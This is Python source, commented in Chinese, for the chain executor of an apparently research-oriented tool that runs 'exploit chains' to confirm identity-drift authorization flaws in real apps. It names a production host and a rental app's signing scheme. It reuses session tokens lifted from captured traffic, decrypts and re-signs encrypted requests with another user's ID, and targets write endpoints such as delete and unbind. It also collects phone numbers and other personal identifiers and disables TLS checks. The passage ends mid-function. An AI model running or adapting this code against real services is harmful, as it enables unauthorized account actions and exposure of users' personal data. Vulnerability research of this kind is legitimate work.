# -*- coding: utf-8 -*-
"""Chain Executor: 执行利用链并收集反馈。

对齐 approach 论文 §3.3 Identity-Preserving Stateful Validation:
1. 实现 Feedback-Guided Drift Validation 算法（Fig. 4）
2. 维护身份不变式 IdInv(W_t^A, W_t')
3. 支持 Node-Level + Path-Level 双级反馈
4. 实现 Checkpoint/RestorePrefix 机制
5. 集成 ConfirmRRDrift 谓词判定
"""
from __future__ import annotations

import json
import re
import ssl
import time
import urllib.parse
import urllib.request
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from minidrifter.core.utils import write_json
from minidrifter.runtime_trace.feedback_engine import FeedbackEngine
from minidrifter.runtime_trace.feedback_alts import (
    apply_node_alt,
    attach_step_feedback_metadata,
    ccrs_for_path,
    response_guided_alt,
    synthesize_node_alts,
    synthesize_workflow_alts,
)
from minidrifter.runtime.crypto.registry import get_crypto_engine_for_pack, CryptoCapability
from minidrifter.runtime.crypto.universal_build import (
    build_crypto_http_request,
    session_context_from_pool,
    transport_style_of,
    FORM_BODY_STYLES,
    HEADER_QUERY_STYLES,
)
from minidrifter.runtime.crypto.aes_cfb_md5_wrapper import WrapperSessionContext

SCHEMA_VERSION = '1.2.0'  # Fig.4 node + workflow feedback actually executable

FEEDBACK_MODES = ('full', 'one_shot', 'no_node', 'no_workflow')

_FORM_ENVELOPE = frozenset({'cid', 'q', 'sign', 'uid'})
_REPAIRABLE_HTTP = frozenset({288, 400, 404, 405, 415, 422})
_WRITE_PATH_RE = re.compile(
    r'unbind|un-bind|delete|putoff|puton|save|modify|remove|update|edit|create|add',
    re.I,
)
_DRIFT_PRIORITY = (
    'userid', 'uid', 'byuserid', 'memberid', 'houseid', 'adduser', 'bindid', 'unionid',
    'titleid', 'title', 'openid', 'phone', 'mobile',
)
_CAPTURE_FIELDS = (
    'UnionId', 'unionId', 'BindId', 'bindId', 'PhoneNumber', 'phoneNumber',
    'UserId', 'userId', 'titleId', 'TitleId', 'title', 'Title',
    'houseId', 'HouseId', 'memberId', 'MemberId', 'addUser', 'AddUser',
)
_DRIFT_SKIP = frozenset({
    'token', 'authorization', 'appidentity', 'channelid', 'bycityid',
})

# 字段名 canonical 映射（红城等 JSON body 大小写）
_CANON_FIELD_CASE = {
    'memberid': 'memberId',
    'houseid': 'houseId',
    'userid': 'userId',
    'adduser': 'addUser',
    'linkname': 'linkName',
}
_SENSITIVE_KEY_RE = re.compile(
    r'person(real)?name|personnumberid|idcard|identitycard|realname|'
    r'idnumber|certno|certnumber|contactphone|phonenumber|mobile|'
    r'身份证|姓名',
    re.I,
)

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE
try:
    _ssl_ctx.options |= getattr(ssl, 'OP_LEGACY_SERVER_CONNECT', 0x4)
except Exception:
    pass
try:
    _ssl_ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
except Exception:
    pass


def _utc_now() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat().replace('+00:00', 'Z')


def _http(url: str, data: Optional[Dict[str, Any]] = None,
          headers: Optional[Dict[str, str]] = None,
          method: Optional[str] = None,
          timeout: int = 15) -> Tuple[int, str, float]:
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    ct = str(h.get('Content-Type') or h.get('content-type') or '').lower()
    if isinstance(data, dict):
        if 'application/json' in ct:
            body = json.dumps(data, ensure_ascii=False).encode('utf-8')
            h.setdefault('Content-Type', 'application/json')
        else:
            body = urllib.parse.urlencode(data).encode()
    elif isinstance(data, str):
        body = data.encode()
    else:
        body = data
    req = urllib.request.Request(url, data=body, headers=h, method=method or ("POST" if body else "GET"))
    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx) as r:
            return r.status, r.read().decode("utf-8", "replace"), (time.time() - start) * 1000
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), (time.time() - start) * 1000
    except Exception as e:
        return -1, str(e), (time.time() - start) * 1000


def _gbk(s: str) -> str:
    for enc in ("utf-8", "gbk"):
        try:
            return s.encode("latin1").decode(enc)
        except Exception:
            pass
    return s


# ─── 执行状态 ───

class ExecutionState:
    """执行状态 Σ：对齐 approach 的 Σ_0"""

    def __init__(self):
        self.variables: Dict[str, Any] = {}      # 运行时变量
        self.identity_subject: Optional[str] = None  # 当前身份主体 A
        self.session_state: Dict[str, Any] = {}  # 会话状态
        self.checkpoint_stack: List[Dict[str, Any]] = []  # 检查点栈

    def checkpoint(self, name: str = '') -> Dict[str, Any]:
        """创建检查点 q = Checkpoint(Σ, Ω, π')"""
        cp = {
            'name': name,
            'variables': dict(self.variables),
            'identity_subject': self.identity_subject,
            'session_state': dict(self.session_state),
            'timestamp': _utc_now(),
        }
        self.checkpoint_stack.append(cp)
        return cp

    def restore(self, checkpoint: Dict[str, Any]) -> bool:
        """恢复检查点 RestorePrefix(q)"""
        try:
            self.variables = dict(checkpoint.get('variables', {}))
            self.identity_subject = checkpoint.get('identity_subject')
            self.session_state = dict(checkpoint.get('session_state', {}))
            return True
        except Exception:
            return False

    def pop_checkpoint(self) -> Optional[Dict[str, Any]]:
        if self.checkpoint_stack:
            return self.checkpoint_stack.pop()
        return None


class DriftState:
    """漂移状态 Ω：对齐 approach 的 Ω = {s ↦ c_s^Δ}"""

    def __init__(self):
        self.drift_map: Dict[str, Any] = {}       # 漂移点 → 漂移值
        self.invalidated: Set[str] = set()         # 已失效的下游凭证
        self.realized_lineage: List[str] = []      # 已实现的漂移谱系 π'
        self.blocked_branches: Set[str] = set()    # B: 被阻塞的分支选择

    def set_drift(self, point: str, value: Any) -> None:
        self.drift_map[point] = value
        self.realized_lineage.append(point)

    def invalidate_downstream(self, region: Set[str]) -> None:
        """使漂移影响区域的下游凭证失效"""
        for nid in region:
            self.invalidated.add(nid)
            # 从 realized_lineage 中移除
            if nid in self.realized_lineage:
                self.realized_lineage.remove(nid)

    def is_blocked(self, branch_choice: str) -> bool:
        return branch_choice in self.blocked_branches

    def block_branch(self, branch_choice: str) -> None:
        self.blocked_branches.add(branch_choice)


class ChainExecutor:
    """执行单条利用链：对齐 approach 的 Feedback-Guided Drift Validation"""

    def __init__(self, pack_dir: Path, feedback: Optional[FeedbackEngine] = None,
                 feedback_mode: str = 'full'):
        self.pack_dir = Path(pack_dir)
        self.feedback = feedback or FeedbackEngine(pack_dir)
        mode = (feedback_mode or 'full').strip().lower().replace('-', '_')
        self.feedback_mode = mode if mode in FEEDBACK_MODES else 'full'
        self.context: Dict[str, Any] = {}  # 链执行上下文（变量池）
        self.history: List[Dict[str, Any]] = []
        self._node_base_urls: Dict[str, str] = {}  # node_id -> base_url

        # 自动加载加密引擎（如果项目存在 crypto 静态 profile）
        self.crypto_engine: Optional[Any] = None
        self.crypto_cap: Optional[CryptoCapability] = None
        self._global_crypto_pool: Dict[str, Any] = {}
        self._trace_index: Dict[str, Any] = {}
        self._bcg: Dict[str, Any] = {}
        self._ccrs: List[Dict[str, Any]] = []
        try:
            self.crypto_engine, self.crypto_cap = get_crypto_engine_for_pack(self.pack_dir)
            self._trace_index = self._load_trace_index()
            self._global_crypto_pool = self._load_global_crypto_pool()
        except Exception:
            pass
        self._load_static_graphs()
        self._pinned_donors = self._load_pinned_donors()
        self._session_identity_cache: Optional[Dict[str, Any]] = None
        self._runtime_identity: Dict[str, Any] = {}

    def _load_pinned_donors(self) -> Dict[str, List[Any]]:
        """Pack-local crbd_donor_seeds.json only (avoid cross-app donor pollution)."""
        out: Dict[str, List[Any]] = {}
        for cand in (
            self.pack_dir / 'crbd_donor_seeds.json',
            self.pack_dir.parent / 'crbd_donor_seeds.json',
        ):
            try:
                if not cand.exists():
                    continue
                raw = json.loads(cand.read_text(encoding='utf-8')) or {}
                fields = raw.get('fields') if isinstance(raw, dict) else None
                if not isinstance(fields, dict):
                    fields = raw if isinstance(raw, dict) else {}
                for k, vals in fields.items():
                    key = str(k).lower()
                    seq = vals if isinstance(vals, list) else [vals]
                    bucket = out.setdefault(key, [])
                    for v in seq:
                        if v in (None, ''):
                            continue
                        sv = str(v)
                        if sv not in {str(x) for x in bucket}:
                            bucket.append(v)
            except Exception:
                continue
        return out

    def _load_static_graphs(self) -> None:
        try:
            from minidrifter.rpgraph.io import rpgraph_path as _rpgraph_path
            bcg_path = _rpgraph_path(self.pack_dir)
            if bcg_path.exists():
                self._bcg = json.loads(bcg_path.read_text(encoding='utf-8'))
        except Exception:
            self._bcg = {}
        try:
            rcr_path = self.pack_dir / 'rcr_pack.json'
            if rcr_path.exists():
                self._ccrs = (json.loads(rcr_path.read_text(encoding='utf-8')) or {}).get('ccrs') or []
        except Exception:
            self._ccrs = []

    def _node_feedback_on(self) -> bool:
        return self.feedback_mode in ('full', 'no_workflow')

    def _workflow_feedback_on(self) -> bool:
        return self.feedback_mode in ('full', 'no_node')

    def _load_trace_index(self) -> Dict[str, Any]:
        """加载 HAR 的 trace_index 供运行时 fallback 使用。"""
        try:
            har_dir = self.pack_dir.parent / 'CRBD_validation' / 'trace' / 'subject_A'
            if not har_dir.exists():
                return {}
            for harf in har_dir.glob('*.har'):
                from minidrifter.runtime_trace.crbd_probe import load_trace_index
                idx = load_trace_index(harf)
                if idx.get('ok'):
                    return idx
        except Exception:
            pass
        return {}

    def _harvest_identity_from_obj(self, data: Any, out: Dict[str, Any]) -> None:
        for field in _CAPTURE_FIELDS:
            if field in out:
                continue
            val = self._deep_find_field(data, field)
            if val not in (None, '', [], {}):
                out[field] = val

    def _session_identity_values(self) -> Dict[str, Any]:
        """HAR + 本批已跑链捕获的 BindId/UnionId/titleId，供 Node 反馈补空参数。"""
        if self._session_identity_cache is None:
            harvested: Dict[str, Any] = {}
            by_path = (self._trace_index or {}).get('by_path') or {}
            for path_key, items in by_path.items():
                # 仅从公开二手房 get/{id} 捞 houseId（避免 talentHouse 等误匹配）
                m = re.search(r'/public/secondhandhouse/get/(\d{6,})', str(path_key), re.I)
                if m and 'houseId' not in harvested:
                    harvested['houseId'] = m.group(1)
                for it in items[:3]:
                    req = it.get('request') or {}
                    for bag in (req.get('query') or {}, req.get('body_json') or {}, req.get('body_form') or {}):
                        if not isinstance(bag, dict):
                            continue
                        for k, v in bag.items():
                            kl = str(k).lower()
                            if kl in ('houseid', 'memberid', 'userid') and v not in (None, ''):
                                harvested.setdefault(str(k), v)
                            # 不把泛化 id 当成 houseId（易污染成 userId/公寓 id）
                    resp = it.get('response_body')
                    if not isinstance(resp, dict):
                        continue
                    data: Any = resp
                    result = resp.get('Result')
                    if isinstance(result, str) and self.crypto_engine:
                        try:
                            dec = self.crypto_engine.decrypt_response_result(result)
                            if isinstance(dec, (dict, list)):
                                data = dec
                        except Exception:
                            continue
                    self._harvest_identity_from_obj(data, harvested)
                if len(harvested) >= 8:
                    break
            # 已知可复现房源优先；memberId 不在此强行覆盖（避免把房东 ID 当主写主体）
            for pref in (self._pinned_donors.get('houseid') or []):
                if pref not in (None, ''):
                    harvested['houseId'] = str(pref)
                    break
            self._session_identity_cache = harvested
        out = dict(self._session_identity_cache)
        out.update(self._runtime_identity)
        return out

    def _load_global_crypto_pool(self) -> Dict[str, Any]:
        """从 trace_index 提取全局 session 字段（Token/AppVersion/...）。"""
        pool: Dict[str, Any] = {}
        if not self._trace_index.get('ok'):
            if self.crypto_cap and self.crypto_cap.md5_aeskey:
                pool['md5_aeskey'] = self.crypto_cap.md5_aeskey
            return pool
        by_path = self._trace_index.get('by_path') or {}
        for items in by_path.values():
            for it in items:
                req = it.get('request') or {}
                headers = {k.lower(): v for k, v in (req.get('headers') or {}).items()}
                if headers.get('token'):
                    pool['Token'] = headers['token']
                if headers.get('access-token'):
                    pool['access-token'] = headers['access-token']
                    if not pool.get('Token'):
                        pool['Token'] = headers['access-token']
                if headers.get('appversion'):
                    pool['AppVersion'] = headers['appversion']
                if headers.get('appplatform'):
                    pool['AppPlatform'] = headers['appplatform']
                if headers.get('appidentity'):
                    pool['AppIdentity'] = headers['appidentity']
                if headers.get('appid'):
                    pool['appid'] = headers['appid']
                if headers.get('terminal'):
                    pool['terminal'] = headers['terminal']
                if headers.get('currentappid'):
                    pool['currentappid'] = headers['currentappid']
                if (pool.get('Token') or pool.get('access-token')) and (pool.get('AppVersion') or pool.get('appid')):
                    break
            if (pool.get('Token') or pool.get('access-token')) and (pool.get('AppVersion') or pool.get('appid')):
                break
        # 尝试解密 AppIdentity 获取 OperatorId
        if self.crypto_engine and pool.get('AppIdentity'):
            try:
                app_fields = self.crypto_engine.decrypt_app_identity(pool['AppIdentity'])
                if app_fields.get('OperatorId'):
                    pool['OperatorId'] = app_fields['OperatorId']
                for k in ['Version', 'Source', 'Company', 'ModelVersion']:
                    if app_fields.get(k) and not pool.get(k):
                        pool[k] = app_fields[k]
            except Exception:
                pass
        if self.crypto_cap and self.crypto_cap.md5_aeskey and not pool.get('md5_aeskey'):
            pool['md5_aeskey'] = self.crypto_cap.md5_aeskey
        return pool

    def _har_fallback_entry(self, path: str) -> Optional[Dict[str, Any]]:
        """根据 path 从 trace_index 中查找 HAR 条目（不区分大小写）。"""
        if not self._trace_index.get('ok'):
            return None
        by_path = self._trace_index.get('by_path') or {}
        # 精确匹配
        if path in by_path:
            items = by_path[path]
            # 优先返回成功响应的条目
            for it in items:
                if int(it.get('response_status') or 0) in range(200, 300):
                    return it
            return items[0]
        # 不区分大小写匹配
        path_lower = path.lower()
        for p, items in by_path.items():
            if p.lower() == path_lower:
                for it in items:
                    if int(it.get('response_status') or 0) in range(200, 300):
                        return it
                return items[0]
        return None

    def _resolve_base_url(self, node: Dict[str, Any], default: str = '') -> str:
        """根据节点元数据解析 base_url"""
        meta = node.get('metadata') or {}
        har_entry = meta.get('har_entry') or {}
        req = har_entry.get('request') or {}
        url = req.get('url') or ''
        if url:
            from urllib.parse import urlparse
            p = urlparse(url)
            return f"{p.scheme}://{p.netloc}"
        # 从 path 推断（通用规则，不硬编码）
        path = node.get('path') or ''
        # 尝试从 RCR 的 endpoint 信息获取 host
        RCR = meta.get('RCR') or {}
        endpoint = RCR.get('endpoint') or {}
        host = (endpoint.get('host') or '').strip()
        if host:
            from urllib.parse import urlparse
            # RCR 偶发把网关路径写进 host：hongcheng.dfsjcloud.com/hcapi
            if '://' in host:
                p = urlparse(host)
                return f"{p.scheme}://{p.netloc}"
            if '/' in host:
                netloc = host.split('/', 1)[0]
                return f'https://{netloc}'
            return f'https://{host}'
        return default

    @staticmethod
    def _join_base_path(base_url: str, path: str) -> str:
        """拼接 base+path，避免 /hcapi + /hcapi/wx 叠成 /hcapi/hcapi/wx。"""
        from urllib.parse import urlparse
        base = (base_url or '').rstrip('/')
        p = path or ''
        if not p:
            return base
        if p.startswith('http://') or p.startswith('https://'):
            return p
        if not p.startswith('/'):
            p = '/' + p
        if not base:
            return p
        bu = urlparse(base if '://' in base else f'https://dummy{base}')
        bpath = (bu.path or '').rstrip('/')
        if bpath and (p == bpath or p.startswith(bpath + '/')):
            if '://' in base:
                return f"{bu.scheme}://{bu.netloc}{p}"
            return p
        return base + p

    def _build_crypto_pool(self, step: Dict[str, Any], sigma: ExecutionState) -> Dict[str, Any]:
        """从 HAR 捕获和运行时变量构建加密 session pool。"""
        pool: Dict[str, Any] = {}
        meta = step.get('metadata') or {}
        har_entry = meta.get('har_entry') or {}
        # 如果 step 本身没有 HAR 数据，从 trace_index 按 path 查找 fallback
        if not har_entry:
            fallback = self._har_fallback_entry(step.get('path') or '')
            if fallback:
                har_entry = fallback
        req = har_entry.get('request') or {}
        headers = {k.lower(): v for k, v in (req.get('headers') or {}).items()}

        # 1) 从 HAR 头提取基础会话字段
        if headers.get('token'):
            pool['Token'] = headers['token']
        if headers.get('appversion'):
            pool['AppVersion'] = headers['appversion']
        if headers.get('appplatform'):
            pool['AppPlatform'] = headers['appplatform']
        if headers.get('appidentity'):
            pool['AppIdentity'] = headers['appidentity']

        # form_cid_q_sign：uid/cid 在 body，不是 Token
        body_form = req.get('body_form') or {}
        if isinstance(body_form, dict):
            if body_form.get('uid') and not pool.get('uid'):
                pool['uid'] = body_form['uid']
            if body_form.get('cid') and not pool.get('cid'):
                pool['cid'] = body_form['cid']

        # 2) 尝试解密 AppIdentity 获取 OperatorId / Version / Source / Company / ModelVersion
        if self.crypto_engine and headers.get('appidentity'):
            try:
                app_fields = self.crypto_engine.decrypt_app_identity(headers['appidentity'])
                if app_fields.get('OperatorId'):
                    pool['OperatorId'] = app_fields['OperatorId']
                if app_fields.get('Version'):
                    pool['Version'] = app_fields['Version']
                if app_fields.get('Source'):
                    pool['Source'] = app_fields['Source']
                if app_fields.get('Company'):
                    pool['Company'] = app_fields['Company']
                if app_fields.get('ModelVersion'):
                    pool['ModelVersion'] = app_fields['ModelVersion']
            except Exception:
                pass

        # 3) 全局 pool 填充默认值（HAR 中的 token/version/operatorId）
        for key in ['Token', 'UserId', 'userId', 'OperatorId', 'AppVersion', 'AppPlatform', 'Version', 'Source', 'Company', 'ModelVersion', 'md5_aeskey']:
            if key in self._global_crypto_pool and not pool.get(key):
                pool[key] = self._global_crypto_pool[key]

        # 4) 从运行时变量覆盖（优先级更高）
        for key in ['Token', 'UserId', 'userId', 'OperatorId', 'AppVersion', 'AppPlatform', 'Version', 'Source']:
            if key in sigma.variables:
                pool[key] = sigma.variables[key]
        # 当前身份主体作为 OperatorId 回退
        if sigma.identity_subject and not pool.get('OperatorId'):
            pool['OperatorId'] = sigma.identity_subject
        # md5_aeskey
        if self.crypto_cap and self.crypto_cap.md5_aeskey:
            pool['md5_aeskey'] = self.crypto_cap.md5_aeskey
        return pool

    @staticmethod
    def _parse_json_with_padding(text: str) -> Any:
        """解析可能被 PKCS7 padding 污染的 JSON 字符串。"""
        text = text.rstrip('\x00').rstrip()
        try:
            return json.loads(text)
        except json.JSONDecodeError as e:
            # 从错误位置向前搜索最近的 } 或 ]，截断后重试
            pos = min(e.pos, len(text))
            for i in range(pos - 1, -1, -1):
                if text[i] in ('}', ']'):
                    try:
                        return json.loads(text[:i + 1])
                    except Exception:
                        continue
            raise

    @staticmethod
    def _fill_path_templates(path: str, values: Dict[str, Any]) -> str:
        if not path or '{' not in path or not values:
            return path
        out = path
        lower_map = {str(k).lower(): v for k, v in values.items() if v is not None}
        # 红城写接口模板常用 {id}，donor/HAR 侧是 houseId
        if 'id' not in lower_map and re.search(r'putoffsale|putonsale|taskdown|taskup', path, re.I):
            for alias in ('houseid', 'house_id'):
                if lower_map.get(alias) is not None:
                    lower_map['id'] = lower_map[alias]
                    break
        for m in re.finditer(r'\{([^/}]+)\}', path):
            name = m.group(1)
            val = values.get(name)
            if val is None:
                val = lower_map.get(name.lower())
            if val is None:
                continue
            out = out.replace('{' + name + '}', str(val), 1)
        return out

    def _build_request(self, step: Dict[str, Any], base_url: str,
                       resolved_inputs: Dict[str, Any], sigma: ExecutionState) -> Dict[str, Any]:
        """构建请求：优先使用加密引擎，否则回退明文 urlencode。
        优先使用 HAR 中的真实 method/path（如果 trace_index 中有匹配）。"""
        path = step.get('path') or ''
        method = (step.get('method') or 'GET').upper()
        force_crypto = step.get('_force_crypto')
        placement = step.get('_placement')

        # 路径模板 {houseId} ← resolved_inputs / 会话身份
        path = self._fill_path_templates(path, resolved_inputs)
        sess = self._session_identity_values()
        if '{' in path:
            path = self._fill_path_templates(path, sess)

        # 尝试从 HAR 修正 method/path（节点反馈已改 method 时不要覆盖）
        har_entry = self._har_fallback_entry(path)
        if har_entry and not step.get('_alt_locked_method'):
            req = har_entry.get('request') or {}
            if req.get('method'):
                method = (req.get('method') or method).upper()
            if req.get('url'):
                from urllib.parse import urlparse
                p = urlparse(req.get('url'))
                har_path = p.path or path
                # 保留带模板的 RR-Drift 路径，勿被无关 HAR 覆盖
                if '{' not in (step.get('path') or ''):
                    path = har_path

        use_crypto = bool(
            self.crypto_engine and self.crypto_cap and transport_style_of(self.crypto_cap) in (
                HEADER_QUERY_STYLES | FORM_BODY_STYLES
            )
        )
        if force_crypto is False:
            use_crypto = False
        elif force_crypto is True and self.crypto_engine and self.crypto_cap:
            use_crypto = True

        # 若存在加密引擎且项目是 header/query 或 form+q 加密传输，则重建签名/加密
        if use_crypto:
            pool = self._build_crypto_pool(step, sigma)
            # 漂移时：让 OperatorId 与请求中的 userId 保持一致（一嗨签名包含 OperatorId）
            for k, v in resolved_inputs.items():
                if str(k).lower() == 'userid' and v is not None and pool.get('OperatorId'):
                    pool['OperatorId'] = str(v)
            style = transport_style_of(self.crypto_cap)
            global_merge = None
            if style in FORM_BODY_STYLES:
                envelope = {
                    str(k): v for k, v in resolved_inputs.items()
                    if str(k).lower() in _FORM_ENVELOPE and v is not None
                }
                params = {
                    str(k): v for k, v in resolved_inputs.items()
                    if str(k).lower() not in _FORM_ENVELOPE and v is not None
                }
                if envelope.get('uid') and not pool.get('uid'):
                    pool['uid'] = envelope['uid']
                if envelope.get('cid') and not pool.get('cid'):
                    pool['cid'] = envelope['cid']
                q_blob = envelope.get('q')
                if q_blob and hasattr(self.crypto_engine, 'decrypt_params_to_obj'):
                    try:
                        base = self.crypto_engine.decrypt_params_to_obj(str(q_blob))
                        if isinstance(base, dict):
                            global_merge = base
                    except Exception:
                        global_merge = None
            else:
                params = {str(k): str(v) for k, v in resolved_inputs.items() if v is not None}
            try:
                built = build_crypto_http_request(
                    self.crypto_engine, self.crypto_cap,
                    method=method, base_url=base_url, path=path,
                    params=params, pool=pool,
                    force_query=placement in ('query', 'encrypted_query'),
                    global_merge=global_merge,
                )
                headers_out = {k: str(v) for k, v in (built.get('headers') or {}).items()}
                if pool.get('Token') and 'Token' not in headers_out and 'token' not in {
                    k.lower() for k in headers_out
                }:
                    headers_out['Token'] = str(pool['Token'])
                out = {
                    'url': built.get('url') or self._join_base_path(base_url, path),
                    'headers': headers_out,
                    'method': built.get('method', method),
                    'crypto': True,
                }
                if built.get('data') is not None:
                    out['data'] = built['data']
                elif built.get('body') is not None:
                    out['data'] = built['body']
                elif built.get('body_form') is not None:
                    out['data'] = built['body_form']
                return out
            except Exception as e:
                # 加密构建失败时回退明文（便于调试）
                pass

        # 明文回退
        url = self._join_base_path(base_url, path)
        headers: Dict[str, str] = {}
        # 从 HAR 复制业务头（红城用 access-token，不是 Bearer）
        har_entry = self._har_fallback_entry(path) or (step.get('metadata') or {}).get('har_entry') or {}
        har_headers = {
            str(k).lower(): str(v)
            for k, v in ((har_entry.get('request') or {}).get('headers') or {}).items()
        }
        for hk in ('terminal', 'appid', 'currentappid', 'access-token', 'token', 'content-type'):
            if har_headers.get(hk):
                # 保留常见大小写
                canon = {
                    'access-token': 'access-token',
                    'token': 'Token',
                    'appid': 'appid',
                    'currentappid': 'currentappid',
                    'terminal': 'terminal',
                    'content-type': 'Content-Type',
                }.get(hk, hk)
                headers[canon] = har_headers[hk]
        if step.get('requires_auth', True) and not step.get('auth_bypass', False):
            token = (
                sigma.variables.get('access_token')
                or sigma.variables.get('access-token')
                or sigma.variables.get('token')
                or sigma.variables.get('Token')
                or self._global_crypto_pool.get('access-token')
                or self._global_crypto_pool.get('Token')
            )
            if token:
                headers.setdefault('access-token', str(token))
                headers.setdefault('Token', str(token))
        for pk in ('terminal', 'appid', 'currentappid'):
            if self._global_crypto_pool.get(pk) and pk not in {k.lower() for k in headers}:
                headers[pk] = str(self._global_crypto_pool[pk])

        put_in_query = method == 'GET' or placement == 'query'
        put_in_body = placement == 'body' or (method != 'GET' and placement != 'query')
        if put_in_query and resolved_inputs and placement != 'body':
            # 已写入路径模板的字段不要再塞 query（红城 detail/{houseId} + ?houseId= 会导致 vo 为空）
            raw_path = step.get('path') or ''
            path_keys = {m.group(1).lower() for m in re.finditer(r'\{([^/}]+)\}', raw_path)}
            # detail/get 资源路径：业务 id 只走 path，不走 query
            if re.search(r'/detail(/|$|\{)|/get/\d+', raw_path, re.I) or re.search(r'/detail/\d+', url):
                path_keys |= {'houseid', 'id', 'house_id'}
            q_inputs = {
                k: v for k, v in resolved_inputs.items()
                if v is not None and str(k).lower() not in path_keys
            }
            qs = urllib.parse.urlencode(q_inputs)
            url = f"{url}?{qs}" if qs else url
        spec = {'url': url, 'headers': headers, 'method': method, 'crypto': False}
        if put_in_body and resolved_inputs:
            if placement == 'body' or placement is None:
                spec['data'] = {k: v for k, v in resolved_inputs.items() if v is not None}
                ct = str(headers.get('Content-Type') or headers.get('content-type') or '').lower()
                if not ct:
                    headers['Content-Type'] = 'application/json'
        return spec

    def execute_chain(self, chain: Dict[str, Any], *,
                      base_url: str = '',
                      mode: str = 'dry-run',
                      variables: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """执行链：对齐 approach 的 Fig. 4 算法"""
        self.context = dict(variables or {})
        remaining = [dict(s) for s in (chain.get('poc_steps') or [])]
        chain_id = chain.get('chain_id') or 'unknown'
        nodes = chain.get('nodes') or {}

        sigma = ExecutionState()
        omega = DriftState()
        sigma.variables.update(self.context)

        drift_point = chain.get('drift_point')
        drift_region = set(chain.get('drift_region') or [])
        if drift_point:
            drift_value = self.context.get(f'drift_{drift_point}')
            if drift_value:
                omega.set_drift(drift_point, drift_value)
            omega.invalidate_downstream(drift_region - {drift_point})

        result: Dict[str, Any] = {
            'chain_id': chain_id,
            'mode': mode,
            'feedback_mode': self.feedback_mode,
            'started_at': _utc_now(),
            'steps': [],
            'final_status': 'unknown',
            'variables': dict(sigma.variables),
            'drift_state': {
                'drift_map': omega.drift_map,
                'invalidated': sorted(omega.invalidated),
                'realized_lineage': omega.realized_lineage,
                'blocked_branches': sorted(omega.blocked_branches),
            },
        }

        idx = 0
        tried_wf: Set[str] = set()
        while idx < len(remaining):
            step = remaining[idx]
            node = nodes.get(step.get('node_id')) or {}
            step = self._prepare_step(step, node)
            remaining[idx] = step
            step_base = self._resolve_base_url(node, base_url)
            cp = sigma.checkpoint(f"step_{step.get('step')}_{idx}")

            step_result = self._execute_step_with_feedback(
                step, step_base, mode, chain_id, sigma, omega, node=node, chain=chain
            )
            result['steps'].append(step_result)

            ok = step_result.get('status') in ('success', 'dry_run')
            if ok and not step_result.get('identity_violation'):
                idx += 1
                continue

            branch_choice = f"{step.get('node_id')}@{cp['name']}"
            omega.block_branch(branch_choice)
            self.feedback.record_branch_blocked(
                branch_choice,
                step_result.get('error') or step_result.get('status') or 'failed',
                cp,
            )
            if not sigma.restore(cp):
                result['final_status'] = 'unresolved'
                result['error'] = 'restore_failed'
                break

            recovered_wf = False
            if self._workflow_feedback_on() and mode != 'dry-run':
                while True:
                    alt = self._find_alternative_path(step, chain, omega, tried_wf)
                    if not alt:
                        break
                    tried_wf.add(alt['id'])
                    omega.block_branch(alt['id'])
                    step_result['alternative_tried'] = True
                    step_result['alternative_id'] = alt['id']
                    step_result['alternative_reason'] = alt.get('reason')
                    kind = alt.get('kind') or ''

                    # insert_producer_prefix：先跑 producer，再重试原失败步（不替换 target）
                    if kind == 'insert_producer_prefix':
                        pref = dict(alt.get('prefix_step') or {})
                        pref_node = nodes.get(pref.get('node_id')) or {}
                        pref = self._prepare_step(pref, pref_node)
                        pref_base = self._resolve_base_url(pref_node, base_url) or step_base
                        pref_result = self._execute_step_with_feedback(
                            pref, pref_base, mode, chain_id, sigma, omega,
                            node=pref_node, chain=chain,
                        )
                        pref_result['alternative_tried'] = True
                        pref_result['alternative_id'] = alt['id']
                        pref_result['alternative_reason'] = alt.get('reason')
                        pref_result['workflow_role'] = 'producer_prefix'
                        result['steps'].append(pref_result)
                        if pref_result.get('status') not in ('success', 'dry_run') or pref_result.get('identity_violation'):
                            continue
                        # 将 producer 输出并入 σ，再重试原 step（含 Node 物化）
                        for k, v in (pref_result.get('extracted') or {}).items():
                            if v not in (None, '', [], {}):
                                sigma.variables[k] = v
                        for bag in (
                            pref_result.get('inputs') or {},
                            pref_result.get('outputs') or {},
                        ):
                            if isinstance(bag, dict):
                                for k, v in bag.items():
                                    if v not in (None, '', [], {}):
                                        sigma.variables.setdefault(k, v)
                        retry = self._execute_step_with_feedback(
                            step, step_base, mode, chain_id, sigma, omega,
                            node=node, chain=chain,
                        )
                        retry['alternative_tried'] = True
                        retry['alternative_id'] = alt['id']
                        retry['alternative_reason'] = alt.get('reason')
                        retry['workflow_role'] = 'retry_after_producer'
                        result['steps'].append(retry)
                        if retry.get('status') in ('success', 'dry_run') and not retry.get('identity_violation'):
                            recovered_wf = True
                            idx += 1
                            break
                        continue

                    alt_step = self._prepare_step(
                        dict(alt.get('step') or {}),
                        nodes.get((alt.get('step') or {}).get('node_id')) or {},
                    )
                    if kind == 'promote_exit':
                        # 用 exit 替换当前失败步，并丢掉后续同 exit 重复步
                        eid = alt_step.get('node_id')
                        remaining[idx] = alt_step
                        remaining[:] = remaining[: idx + 1] + [
                            s for s in remaining[idx + 1 :]
                            if (s.get('node_id') != eid)
                        ]
                    else:
                        remaining[idx] = alt_step

                    alt_base = self._resolve_base_url(
                        nodes.get(alt_step.get('node_id')) or {}, base_url
                    ) or step_base
                    alt_result = self._execute_step_with_feedback(
                        alt_step, alt_base, mode, chain_id, sigma, omega,
                        node=nodes.get(alt_step.get('node_id')) or {},
                        chain=chain,
                    )
                    alt_result['alternative_tried'] = True
                    alt_result['alternative_id'] = alt['id']
                    alt_result['alternative_reason'] = alt.get('reason')
                    result['steps'].append(alt_result)
                    if alt_result.get('status') in ('success', 'dry_run') and not alt_result.get('identity_violation'):
                        recovered_wf = True
                        idx += 1
                        break
                    # 继续试下一条工作流替代
                    step = remaining[idx]
            if recovered_wf:
                continue
            result['final_status'] = 'failed_at_step_' + str(step.get('step'))
            break
        else:
            result['final_status'] = 'completed'

        result['completed_at'] = _utc_now()
